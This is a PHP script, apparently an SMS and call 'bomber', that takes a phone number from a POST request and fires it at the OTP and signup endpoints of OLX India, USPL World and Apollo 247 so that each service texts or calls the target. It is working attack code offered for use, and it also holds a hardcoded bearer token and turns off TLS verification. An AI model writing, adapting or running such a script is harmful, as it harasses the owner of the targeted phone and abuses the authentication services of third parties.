<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Allow-Headers: *");
header("Content-Type: application/json");
    $number = $_POST['number'];
echo $number;
# CURL 

function send_bomb($url, $data, $headers)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $output = curl_exec($ch);
    curl_close($ch);
    $json = json_decode($output, true);
}

# URL DATA HEADERS

#################
# mail for call #
#################

$url_mail1 = "https://www.olx.in/api/auth/authenticate?lang=en-IN";

$data_mail1 = '{"grantType":"email","email":"drstgfguyd@gmail.com","language":"en-IN"}';

$headers_mail1 = array(
    "Host: www.olx.in",
    "content-length: 102",
    "content-type: application/json",
    "accept: */*",
    "origin: https://www.olx.in",
    "accept-encoding: gzip, deflate, br",
    "accept-language: en-US,en;q=0.9,hi;q=0.8"
);

send_bomb($url_mail1, $data_mail1, $headers_mail1);


################
# sms for call #
################


$url_msg1 = "https://www.usplworld.com/mobile-signup/";

$data_msg1 = '{"mobileNumber":"' . $number . '"}';

$headers_msg1 = array(
    "Host: www.usplworld.com",
    "content-length: 29",
    "accept: */*",
    "Content-Type: application/json",
    "x-requested-with: XMLHttpRequest",
    "origin: https://www.usplworld.com",
    "referer: https://www.usplworld.com/login/",
    "accept-encoding: gzip, deflate, br",
    "accept-language: en-US,en;q=0.9"
);

#############################################################################

send_bomb($url_msg1, $data_msg1, $headers_msg1);

$url_msg2 = "https://www.olx.in/api/auth/authenticate?lang=en-IN";

$data_msg2 = '{"grantType":"phone","phone":"+91' . $number . '","language":"en-IN"}';

$headers_msg2 = array(
    "Host: www.olx.in",
    "content-length: 64",
    "content-type: application/json",
    "accept: */*",
    "origin: https://www.olx.in",
    "accept-encoding: gzip, deflate, br",
    "accept-language: en-US,en;q=0.9,hi;q=0.8"
);

send_bomb($url_msg2, $data_msg2, $headers_msg2);

#########################
# url data headers call #
########################


$url1 = 'https://webapi.apollo247.com/';

$data1 = '{"operationName":"getOTPOnCall","variables":{"mobileNumber":"' . $number . '","loginType":"PATIENT","id":"a5708ee0-2ebc-11ed-a420-893965a230ce"},"query":"query getOTPOnCall($mobileNumber: String, $loginType: LOGIN_TYPE, $id: String!) {\n  getOTPOnCall(mobileNumber: $mobileNumber, loginType: $loginType, id: $id) {\n    status\n    loginId\n    message\n    __typename\n  }\n}\n"}';

$headers1 = ['Host: webapi.apollo247.com', 'Accept: */*', 'Content-Type: application/json', 'Authorization: Bearer 3d1833da7020e0602165529446587434', 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36', 'Origin: https://www.apollopharmacy.in', 'Referer: https://www.apollopharmacy.in/', 'Accept-Encoding: gzip, deflate', 'Accept-Language: en-US,en;q=0.9'];

send_bomb($url1, $data1, $headers1);

#############################################################################


$url2 = "https://www.usplworld.com/resend-otp/";

$data2 = '{"mobileNumber":"' . $number . '"}';

$headers2 = [
    "Host: www.usplworld.com",
    "content-length: 29",
    "accept: */*",
    "Content-Type: application/json",
    "x-requested-with: XMLHttpRequest",
    "origin: https://www.usplworld.com",
    "referer: https://www.usplworld.com/login/",
    "accept-encoding : gzip, deflate, br",
    "accept-language: en-US,en;q=0.9"
];

send_bomb($url2, $data2, $headers2);

#############################################################################


$url3 = "https://www.olx.in/api/auth/authenticate?lang=en-IN";

$data3 = '{"grantType":"retry","method":"call","phone":"+91' . $number . '","language":"en-IN"}';

$headers3 = array(
    "Host: www.olx.in",
    "content-length: 80",
    "content-type: application/json",
    "accept: */*",
    "origin: https://www.olx.in",
    "accept-encoding: gzip, deflate, br",
    "accept-language: en-US,en;q=0.9,hi;q=0.8"
);

send_bomb($url3, $data3, $headers3);

############# CALL THE FUNCTION #############

?>